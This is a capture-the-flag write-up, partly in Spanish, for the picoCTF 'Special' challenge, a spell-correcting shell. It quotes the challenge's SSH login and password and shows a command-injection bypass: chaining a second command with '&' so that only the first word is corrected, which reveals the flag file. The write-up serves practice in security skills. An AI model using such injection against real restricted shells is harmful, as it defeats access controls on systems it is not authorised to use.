### Special

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 59161 ctf-player@saturn.picoctf.net`The password is `483e80d4`
### Solución 1 - Con el BYPASS &


```
Special$ Clear & find .
Clear & find . 
sh: 1: Clear: not found
.
./blargh
./blargh/flag.txt
./.cache
./.cache/motd.legal-displayed
Special$ Clear & cat ./blargh/flag.txt
Clear & cat ./blargh/flag.txt 
sh: 1: Clear: not found
picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
```


picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}
### Notas
Con el Bypass & el corrector ya había hecho su "trabajo" en la primera palabra de la línea, dejando el resto del comando intacto.